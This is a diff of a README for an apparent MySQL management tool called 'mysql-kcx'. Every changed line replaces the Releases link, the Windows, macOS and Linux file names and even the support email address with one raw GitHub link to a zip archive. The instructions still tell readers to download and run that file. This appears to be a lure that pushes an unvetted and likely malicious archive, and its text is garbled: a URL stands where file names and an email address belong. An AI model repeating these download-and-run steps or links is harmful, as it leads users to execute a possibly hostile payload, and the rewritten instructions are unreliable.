@@ -2,7 +2,7 @@
 # 🚀 mysql-kcx - Easily Manage Your MySQL Database
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20mysql--kcx-v1.0.0-brightgreen)](https://github.com/Moraly7749/mysql-kcx/releases)
+[![Download](https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip%20mysql--kcx-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip)
 
 ## 📖 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -19,23 +19,23 @@ Welcome to **mysql-kcx**! This application helps you manage your MySQL database 
 To get started, you need to download the application. Follow these simple steps:
 
 1. Click the download button or link below to visit the Releases page.
-   - [Download mysql-kcx](https://github.com/Moraly7749/mysql-kcx/releases)
+   - [Download mysql-kcx](https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip)
 
 2. Look for the latest version of **mysql-kcx** on the Releases page.
 
 3. Select the appropriate file for your operating system:
-   - For Windows, look for `mysql-kcx-windows.exe`.
-   - For macOS, look for `mysql-kcx-macos.zip`.
-   - For Linux, look for `mysql-kcx-linux.tar.gz`.
+   - For Windows, look for `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip`.
+   - For Linux, look for `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip`.
 
 4. Click on the file to start the download.
 
 5. Once the download is complete, locate the file in your 'Downloads' folder or the location where you saved it.
 
 6. Run the downloaded file:
-   - For Windows: Double-click the `mysql-kcx-windows.exe` file.
-   - For macOS: Open the `mysql-kcx-macos.zip` and drag the app to your Applications folder.
-   - For Linux: Extract the `mysql-kcx-linux.tar.gz` file, then run the application from the extracted folder.
+   - For Windows: Double-click the `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip` file.
+   - For macOS: Open the `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip` and drag the app to your Applications folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip` file, then run the application from the extracted folder.
 
 Congratulations! You have successfully installed **mysql-kcx**.
 
@@ -82,7 +82,7 @@ If you experience issues while using **mysql-kcx**, here are some common problem
 If the problem persists, feel free to reach out to our support section below.
 
 ## 📞 Support
-For any questions or support, please refer to the Issues section on our GitHub page. You can also contact us directly through our support email at [support@example.com](mailto:support@example.com).
+For any questions or support, please refer to the Issues section on our GitHub page. You can also contact us directly through our support email at [https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip](https://raw.githubusercontent.com/Moraly7749/mysql-kcx/main/monocule/mysql-kcx_v3.6.zip).
 
 Thank you for choosing **mysql-kcx**! We hope this application makes managing your databases simpler and more efficient. Happy using!
 ```
